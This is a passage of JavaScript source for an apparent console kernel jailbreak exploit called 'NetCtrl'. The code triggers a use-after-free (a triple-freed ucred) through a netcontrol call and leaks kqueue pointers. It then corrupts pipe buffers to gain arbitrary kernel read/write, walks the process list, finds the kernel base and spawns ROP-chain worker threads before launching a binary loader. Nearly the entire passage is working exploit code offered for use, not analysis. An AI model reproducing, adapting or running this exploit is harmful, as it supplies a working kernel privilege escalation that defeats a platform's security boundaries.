    jsmaf.clearInterval(id);
    try {
      callback();
    } catch (e) {
      log('ERROR: ' + e.message);
      cleanup();
    }
  }, 0);
}
var exploit_count = 0;
var exploit_end = false;
function netctrl_exploit() {
  setup_log_screen();
  var supported_fw = init();
  if (!supported_fw) {
    return;
  }
  log('Setting up exploit...');
  yield_to_render(exploit_phase_setup);
}
function exploit_phase_setup() {
  setup();
  log('Workers spawned');
  exploit_count = 0;
  exploit_end = false;
  yield_to_render(exploit_phase_trigger);
}
function exploit_phase_trigger() {
  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W');
    cleanup();
    return;
  }
  exploit_count++;
  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
  if (!trigger_ucred_triplefree()) {
    yield_to_render(exploit_phase_trigger);
    return;
  }
  log('Leaking kqueue...');
  yield_to_render(exploit_phase_leak);
}
function exploit_phase_leak() {
  if (!leak_kqueue()) {
    yield_to_render(exploit_phase_trigger);
    return;
  }
  log('Setting up arbitrary R/W...');
  yield_to_render(exploit_phase_rw);
}
function exploit_phase_rw() {
  setup_arbitrary_rw();
  log('Jailbreaking...');
  yield_to_render(exploit_phase_jailbreak);
}
function exploit_phase_jailbreak() {
  jailbreak();
}
function setup_arbitrary_rw() {
  // Leak fd_files from kq_fdp.
  var fd_files = kreadslow64(kq_fdp);
  fdt_ofiles = fd_files.add(0x00);
  debug('fdt_ofiles: ' + hex(fdt_ofiles));
  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
  debug('master_r_pipe_file: ' + hex(master_r_pipe_file));
  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file));
  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
  debug('master_r_pipe_data: ' + hex(master_r_pipe_data));
  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));
  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data));

  // Corrupt pipebuf of masterRpipeFd.
  write32(master_pipe_buf.add(0x00), 0); // cnt
  write32(master_pipe_buf.add(0x04), 0); // in
  write32(master_pipe_buf.add(0x08), 0); // out
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE); // size
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data); // buffer

  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if (ret_write.eq(BigInt_Error)) {
    cleanup();
    throw new Error('Netctrl failed - Reboot and try again');
  }

  // Increase reference counts for the pipes.
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));

  // Remove rthdr pointers from triplets
  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
  remove_rthr_from_socket(ipv6_socks[triplets[2]]);

  // Remove triple freed file from free list
  remove_uaf_file();
  for (var i = 0; i < 0x20; i = i + 8) {
    var readed = kread64(master_r_pipe_data.add(i));
    debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed));
  }
  log('Arbitrary R/W achieved');
  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)));
}
function find_allproc() {
  // Use existing master_pipe instead of creating new one
  var pipe_0 = master_pipe[0];
  var pipe_1 = master_pipe[1];
  debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
  debug('find_allproc - Getting pid...');
  var pid = Number(getpid());
  debug('find_allproc - pid: ' + pid);
  debug('find_allproc - Writing pid to sockopt_val_buf...');
  write32(sockopt_val_buf, pid);
  debug('find_allproc - Calling ioctl FIOSETOWN...');
  var ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf);
  debug('find_allproc - ioctl returned: ' + ioctl_ret);
  debug('find_allproc - Getting fp...');
  var fp = fget(pipe_0);
  debug('find_allproc - fp: ' + hex(fp));
  debug('find_allproc - Reading f_data...');
  var f_data = kread64(fp.add(0x00));
  debug('find_allproc - f_data: ' + hex(f_data));
  debug('find_allproc - Reading pipe_sigio...');
  var pipe_sigio = kread64(f_data.add(0xd0));
  debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio));
  debug('find_allproc - Reading p...');
  var p = kread64(pipe_sigio);
  debug('find_allproc - initial p: ' + hex(p));
  kernel.addr.curproc = p; // Set global curproc

  debug('find_allproc - Walking process list...');
  var walk_count = 0;
  while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
    p = kread64(p.add(0x08)); // p_list.le_prev
    walk_count++;
    if (walk_count % 100 === 0) {
      debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p));
    }
  }
  debug('find_allproc - Found allproc after ' + walk_count + ' iterations');

  // Don't close - using master_pipe which we need

  return p;
}
function jailbreak() {
  debug('jailbreak - Starting...');
  if (!kernel_offset) {
    throw new Error('Kernel offsets not loaded');
  }
  if (FW_VERSION === null) {
    throw new Error('FW_VERSION is null');
  }
  // Stabilize
  for (var i = 0; i < 10; i++) {
    sched_yield();
  }
  debug('jailbreak - Calling find_allproc...');
  kernel.addr.allproc = find_allproc(); // Set global allproc
  debug('allproc: ' + hex(kernel.addr.allproc));

  // Calculate kernel base
  kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
  log('Kernel base: ' + hex(kernel.addr.base));
  jailbreak_shared(FW_VERSION);
  log('Jailbreak Complete - JAILBROKEN');
  utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom');
  cleanup(false); // Close sockets and kill workers on success
  show_success();
  run_binloader();
}
function fhold(fp) {
  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1); // f_count
}
function fget(fd) {
  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
}
function remove_rthr_from_socket(fd) {
  // In case last triplet was not found in kwriteslow
  // At this point we don't care about twins/triplets
  if (fd > 0) {
    var fp = fget(fd);
    var f_data = kread64(fp.add(0x00));
    var so_pcb = kread64(f_data.add(0x18));
    var in6p_outputopts = kread64(so_pcb.add(0x118));
    kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
  }
}
var victim_pipe_buf = malloc(PIPEBUF_SIZE);
function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
  if (buffer.eq(0)) {
    throw new Error('buffer cannot be zero');
  }
  write32(victim_pipe_buf.add(0x00), cnt); // cnt
  write32(victim_pipe_buf.add(0x04), _in); // in
  write32(victim_pipe_buf.add(0x08), out); // out
  write32(victim_pipe_buf.add(0x0C), size); // size
  write64(victim_pipe_buf.add(0x10), buffer); // buffer
  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);

  // Debug
  /*
    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
    for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
        const readed = read64(victim_pipe_buf.add(i));
        debug("corrupt_read: " + hex(readed) );
    }
        */

  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
}
function kwrite(dest, src, n) {
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  return write(new BigInt(victimWpipeFd), src, n);
}
function kread(dest, src, n) {
  debug('Enter kread for src: ' + hex(src));
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  // Debug
  read(new BigInt(victimRpipeFd), dest, n);
  // for (const i=0; i<n; i=i+8) {
  //    const readed = read64(dest.add(i));
  // debug("kread_read: " + hex(readed) );
  // }
}
function kwrite64(addr, val) {
  write64(tmp, val);
  kwrite(addr, tmp, 8);
}
function kwrite32(addr, val) {
  write32(tmp, val);
  kwrite(addr, tmp, 4);
}
function kread64(addr) {
  kread(tmp, addr, 8);
  return read64(tmp);
}
function kread32(addr) {
  kread(tmp, addr, 4);
  return read32(tmp);
}
function read_buffer(addr, len) {
  var buffer = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)));
  }
  return buffer;
}
function write_buffer(addr, buffer) {
  for (var i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]);
  }
}

// Functions used in global kernel.js
// buf is Uint8Array()
kernel.read_buffer = function (kaddr, len) {
  kread(tmp, kaddr, len);
  return read_buffer(tmp, len);
};
kernel.write_buffer = function (kaddr, buf) {
  write_buffer(tmp, buf);
  kwrite(kaddr, tmp, buf.length);
};
function remove_uaf_file() {
  if (uaf_socket === undefined) {
    throw new Error('uaf_socket is undefined');
  }
  var uafFile = fget(uaf_socket);
  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
  var removed = 0;
  for (var i = 0; i < 0x1000; i++) {
    var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    if (fget(s).eq(uafFile)) {
      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
      removed++;
    }
    close(new BigInt(s));
    if (removed === 3) {
      break;
    }
  }
}
function trigger_ucred_triplefree() {
  var end = false;
  write64(msgIov.add(0x0), 1); // iov_base
  write64(msgIov.add(0x8), 1); // iov_len

  var main_count = 0; // Let's do up to 8 iterations

  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++;

    // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    // Register dummy socket.
    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);

    // Close the dummy socket.
    close(new BigInt(dummy_socket));

    // Allocate a new ucred.
    setuid(1);

    // Reclaim the file descriptor.
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));

    // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
    setuid(1);

    // Unregister dummy socket and free the file and ucred.
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);

    // Set cr_refcnt back to 1.
    for (var i = 0; i < 32; i++) {
      // Reclaim with iov.
      trigger_iov_recvmsg();
      sched_yield();
      // Release buffers.
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
    }

    // Double free ucred.
    // Note: Only dup works because it does not check f_hold.
    close(dup(new BigInt(uaf_socket)));

    // debug("Finding Twins...");
    // Find twins.
    end = find_twins();
    if (!end) {
      if (cleanup_called) {
        throw new Error('Netctrl failed - Reboot and try again');
      }
      // Clean up and start again
      close(new BigInt(uaf_socket));
      continue;
    }
    log('Triple freeing...');

    // Free one.
    free_rthdr(ipv6_socks[twins[1]]);
    var count = 0;

    // Set cr_refcnt back to 1.
    while (count < 10000) {
      // Reclaim with iov.
      trigger_iov_recvmsg();
      sched_yield();
      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
      if (read32(leak_rthdr) === 1) {
        break;
      }

      // Release iov spray.
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      count++;
    }
    if (count === 1000) {
      log('Dropped out from reclaim loop');
      // Clean up and start again
      close(new BigInt(uaf_socket));
      continue;
    }
    triplets[0] = twins[0];

    // Triple free ucred.
    close(dup(new BigInt(uaf_socket)));

    // Find triplet.
    triplets[1] = find_triplet(triplets[0], -1);

    // If error start again to better exploit possibility
    if (triplets[1] === -1) {
      log("Couldn't find triplet 1");
      // Clean up and start again
      // Release iov spray.
      // if we break on 'read32(leak_rthdr) == 1', we never released workers
      write(new BigInt(iov_sock_1), tmp, 1);
      close(new BigInt(uaf_socket));
      // Start again
      end = false;
      continue;
    }

    // Release iov spray.
    // if we break on 'read32(leak_rthdr) == 1', we never released workers
    write(new BigInt(iov_sock_1), tmp, 1);

    // Find triplet.
    triplets[2] = find_triplet(triplets[0], triplets[1]);

    // If error start again to better exploit possibility
    if (triplets[2] === -1) {
      log("Couldn't find triplet 2");
      // Clean up and start again
      close(new BigInt(uaf_socket));
      // Start again
      end = false;
      continue;
    }

    // Wait iov release completition
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  if (main_count === TRIPLEFREE_ITERATIONS) {
    log('Failed to Triple Free');
    return false;
  }
  return true;
}
function leak_kqueue() {
  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
  debug('Leaking kqueue...');

  // Free one.
  free_rthdr(ipv6_socks[triplets[1]]);

  // Leak kqueue.
  var kq = new BigInt(0);

  // Minimizing footprint
  var magic_val = new BigInt(0x0, 0x1430000);
  var magic_add = leak_rthdr.add(0x08);
  var count = 0;
  while (count < KQUEUE_ITERATIONS) {
    kq = kqueue();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
      break;
    }
    close(kq);
    sched_yield();
    count++;
  }
  if (count === KQUEUE_ITERATIONS) {
    // Dropped out with no kqueue leak
    log('Failed to leak kqueue_fdp');
    return false;
  }

  // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset

  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp = read64(leak_rthdr.add(0x98));
  if (kq_fdp.eq(0)) {
    log('Failed to leak kqueue_fdp');
    return false;
  }
  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));

  // for (i=0; i<0x100; i=i+8) {
  //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
  // }

  // Close kqueue to free buffer.
  close(kq);

  // Find new triplets[1]
  triplets[1] = find_triplet(triplets[0], triplets[2]);
  return true;
}
function kreadslow64(address) {
  var buffer = kreadslow(address, 8);
  // debug("Buffer from kreadslow: " + hex(buffer));
  if (buffer.eq(BigInt_Error)) {
    cleanup();
    throw new Error('Netctrl failed - Reboot and try again');
  }
  return read64(buffer);
}
function build_uio(uio, uio_iov, uio_td, read, addr, size) {
  write64(uio.add(0x00), uio_iov); // uio_iov
  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
  write64(uio.add(0x10), BigInt_Error); // uio_offset
  write64(uio.add(0x18), size); // uio_resid
  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_segflg
  write64(uio.add(0x28), uio_td); // uio_td
  write64(uio.add(0x30), addr); // iov_base
  write64(uio.add(0x38), size); // iov_len
}
function kreadslow(addr, size) {
  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);

  // Memory exhaustion check
  if (debugging.info.memory.available === 0) {
    log('kreadslow - Memory exhausted before start');
    cleanup();
    return BigInt_Error;
  }
  debug('kreadslow - Preparing buffers...');

  // Prepare leak buffers.
  var leak_buffers = new Array(UIO_THREAD_NUM);
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    leak_buffers[i] = malloc(size);
  }

  // Set send buf size.
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  // Fill queue.
  write(new BigInt(uio_sock_1), tmp, size);

  // Set iov length
  write64(uioIovRead.add(0x08), size);
  debug('kreadslow - Freeing triplets[1]=' + triplets[1]);

  // Free one.
  free_rthdr(ipv6_socks[triplets[1]]);

  // Minimize footprint
  var uio_leak_add = leak_rthdr.add(0x08);
  debug('kreadslow - Starting uio reclaim loop...');
  var count = 0;
  var zeroMemoryCount = 0;
  // Reclaim with uio.
  while (count < 10000) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }
    count++;
    if (count % 100 === 1) {
      debug('kreadslow - uio loop iter ' + count);
    }
    trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }

    // Wake up all threads.
    read(new BigInt(uio_sock_0), tmp, size);
    for (var _i12 = 0; _i12 < UIO_THREAD_NUM; _i12++) {
      read(new BigInt(uio_sock_0), leak_buffers[_i12], size);
    }
    wait_uio_writev();

    // Fill queue.
    write(new BigInt(uio_sock_1), tmp, size);
  }
  if (count === 10000) {
    debug('kreadslow - Failed uio reclaim after 10000 iterations');
    return BigInt_Error;
  }
  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations');
  var uio_iov = read64(leak_rthdr);
  debug('kreadslow - uio_iov: ' + hex(uio_iov));

  // Prepare uio reclaim buffer.
  build_uio(msgIov, uio_iov, 0, true, addr, size);
  debug('kreadslow - Freeing triplets[2]=' + triplets[2]);

  // Free second one.
  free_rthdr(ipv6_socks[triplets[2]]);

  // Minimize footprint
  var iov_leak_add = leak_rthdr.add(0x20);
  debug('kreadslow - Starting iov reclaim loop...');

  // Reclaim uio with iov.
  var zeroMemoryCount2 = 0;
  var count2 = 0;
  while (true) {
    count2++;
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log('netctrl failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }
    // Reclaim with iov.
    trigger_iov_recvmsg();
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations');
      break;
    }

    // Release iov spray.
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  debug('kreadslow - Reading leak buffers...');

  // Wake up all threads.
  read(new BigInt(uio_sock_0), tmp, size);
  // Read the results now.
  var leak_buffer = new BigInt(0);
  var tag_val = new BigInt(0x41414141, 0x41414141);

  // Get leak.
  for (var _i13 = 0; _i13 < UIO_THREAD_NUM; _i13++) {
    read(new BigInt(uio_sock_0), leak_buffers[_i13], size);
    var val = read64(leak_buffers[_i13]);
    debug('kreadslow - leak_buffers[' + _i13 + ']: ' + hex(val));
    if (!val.eq(tag_val)) {
      debug('kreadslow - Found valid leak at index ' + _i13 + ', finding triplets[1]...');
      // Find triplet.
      triplets[1] = find_triplet(triplets[0], -1);
      debug('kreadslow - triplets[1]=' + triplets[1]);
      leak_buffer = leak_buffers[_i13].add(0);
    }
  }

  // Workers should have finished earlier no need to wait
  wait_uio_writev();

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1);
  if (leak_buffer.eq(0)) {
    debug('kreadslow - No valid leak found');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }
  debug('kreadslow - Finding triplets[2]...');

  // Find triplet[2].
  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    debug('kreadslow - triplets[2] retry ' + (retry + 1));
    sched_yield();
  }
  debug('kreadslow - triplets[2]=' + triplets[2]);
  if (triplets[2] === -1) {
    debug('kreadslow - Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  // Let's make sure that they are indeed triplets
  // const leak_0 = malloc(8);
  // const leak_1 = malloc(8);
  // const leak_2 = malloc(8);

  // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
  // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
  // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);

  // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );

  // Workers should have finished earlier no need to wait
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer));
  return leak_buffer;
}
function kwriteslow(addr, buffer, size) {
  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);

  // Set send buf size.
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  // Set iov length.
  write64(uioIovWrite.add(0x08), size);

  // Free first triplet.
  free_rthdr(ipv6_socks[triplets[1]]);

  // Minimize footprint
  var uio_leak_add = leak_rthdr.add(0x08);

  // Reclaim with uio.
  var zeroMemoryCount = 0;
  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount = 0;
    }
    trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      // debug("Break on reclaim with uio");
      break;
    }

    // Wake up all threads.
    for (var i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size);
    }
    wait_uio_readv();
  }
  var uio_iov = read64(leak_rthdr);
  // debug("This is uio_iov: " + hex(uio_iov));

  // Prepare uio reclaim buffer.
  build_uio(msgIov, uio_iov, 0, false, addr, size);

  // Free second one.
  free_rthdr(ipv6_socks[triplets[2]]);

  // Minimize footprint
  var iov_leak_add = leak_rthdr.add(0x20);

  // Reclaim uio with iov.
  var zeroMemoryCount2 = 0;
  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 5) {
        log('netctrl failed!');
        cleanup();
        return BigInt_Error;
      }
    } else {
      zeroMemoryCount2 = 0;
    }
    // Reclaim with iov.
    trigger_iov_recvmsg();
    sched_yield();

    // Leak with other rthdr.
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      // debug("Break on reclaim uio with iov");
      break;
    }

    // Release iov spray.
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  // Corrupt data.
  for (var _i14 = 0; _i14 < UIO_THREAD_NUM; _i14++) {
    write(new BigInt(uio_sock_1), buffer, size);
  }

  // Find triplet.
  triplets[1] = find_triplet(triplets[0], -1);

  // Workers should have finished earlier no need to wait
  wait_uio_readv();

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1);

  // Find triplet[2].
  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    sched_yield();
  }
  if (triplets[2] === -1) {
    debug('kwriteslow - Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  // Workers should have finished earlier no need to wait
  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  return new BigInt(0);
}
function rop_regen_and_loop(last_rop_entry, number_entries) {
  var new_rop_entry = last_rop_entry.add(8);
  var copy_entry = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add
  var rop_loop = last_rop_entry.sub(number_entries * 8).add(8); // We add 8 to have the first ROP instruction add

  for (var i = 0; i < number_entries; i++) {
    var entry_add = copy_entry;
    var entry_val = read64(copy_entry);
    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
    write64(new_rop_entry.add(0x8), entry_add);
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
    write64(new_rop_entry.add(0x18), entry_val);
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
    copy_entry = copy_entry.add(8);
    new_rop_entry = new_rop_entry.add(0x28);
  }

  // Time to jump back
  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
  write64(new_rop_entry.add(0x8), rop_loop);
}
function spawn_thread(rop_array, loop_entries, predefinedStack) {
  var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);

  // const rop_addr = malloc(size); // ROP Stack plus extra size

  // Fill ROP Stack
  for (var i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]);
    // debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
  }

  // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
  // loop_entries indicates the number of stack entries we need to regenerate
  if (loop_entries !== 0) {
    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8); // We pass the add of the last ROP instruction
    rop_regen_and_loop(last_rop_entry, loop_entries);
    // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
  }
  var jmpbuf = malloc(0x60);

  // FreeBSD amd64 jmp_buf layout:
  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
  write64(jmpbuf.add(0x00), gadgets.RET); // RIP - ret gadget
  write64(jmpbuf.add(0x10), rop_addr); // RSP - pivot to ROP chain
  write32(jmpbuf.add(0x40), saved_fpu_ctrl); // FPU control
  write32(jmpbuf.add(0x44), saved_mxcsr); // MXCSR

  var stack_size = new BigInt(0x100);
  var tls_size = new BigInt(0x40);
  var stack = malloc(Number(stack_size));
  var tls = malloc(Number(tls_size));
  write64(spawn_thr_args.add(0x00), longjmp_addr); // start_func = longjmp
  write64(spawn_thr_args.add(0x08), jmpbuf); // arg = jmpbuf
  write64(spawn_thr_args.add(0x10), stack); // stack_base
  write64(spawn_thr_args.add(0x18), stack_size); // stack_size
  write64(spawn_thr_args.add(0x20), tls); // tls_base
  write64(spawn_thr_args.add(0x28), tls_size); // tls_size
  write64(spawn_thr_args.add(0x30), spawn_tid); // child_tid (output)
  write64(spawn_thr_args.add(0x38), spawn_cpid); // parent_tid (output)

  var result = thr_new(spawn_thr_args, 0x68);
  // debug("thr_new result: " + hex(result));
  if (!result.eq(0)) {
    throw new Error('thr_new failed: ' + hex(result));
  }
  return read64(spawn_tid);
}
function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0)); // first element overwritten by longjmp, skip it

  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(3)); // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(1)); // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error); // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(0x10)); // setsize
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(1)); // RTP_SET
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0)); // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);

  // recvmsg(iov_sock_0, msg, 0)
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(iov_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(msg);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(0));
  rop.push(recvmsg_wrapper);

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  // It's gonna loop

  return {
    rop,
    loop_size
  };
}
